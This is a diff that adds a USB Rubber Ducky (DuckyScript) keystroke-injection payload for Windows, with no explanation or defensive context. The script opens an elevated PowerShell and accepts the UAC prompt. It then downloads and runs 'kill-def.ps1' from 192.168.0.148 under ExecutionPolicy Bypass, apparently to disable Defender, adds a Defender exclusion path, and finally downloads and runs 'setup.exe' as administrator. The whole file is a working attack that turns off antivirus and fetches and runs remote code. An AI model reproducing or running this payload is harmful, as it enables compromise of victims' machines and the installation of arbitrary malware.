@@ -1,0 +1,31 @@
+DELAY 1000
+REM Open PowerShell as Administrator
+GUI r
+DELAY 1000
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 15000
+ALT y
+ENTER
+DELAY 11000
+ENTER
+REM Wait for the UAC prompt and then type the command
+STRING Invoke-WebRequest -Uri "http://192.168.0.148:8001/kill-def.ps1" -OutFile "C:\Users\Public\Downloads\kill-def.ps1"
+ENTER
+DELAY 5000
+STRING powershell -ExecutionPolicy Bypass -File "C:\Users\Public\Downloads\kill-def.ps1"
+ENTER
+DELAY 10000
+STRING Start-Process powershell "-File C:\Users\Public\Downloads\kill-def.ps1" -Verb runAs
+ENTER
+DELAY 4000
+STRING Add-MpPreference -ExclusionPath "C:\Users\Public\Downloads"
+ENTER
+DELAY 6000
+STRING Invoke-WebRequest -Uri "http://192.168.0.148:8001/setup.exe" -OutFile "C:\Users\Public\Downloads\setup.exe"
+ENTER
+DELAY 7000
+STRING Start-Process -File "C:\Users\Public\Downloads\setup.exe" -Verb runAs
+ENTER
+STRING exit
+ENTER
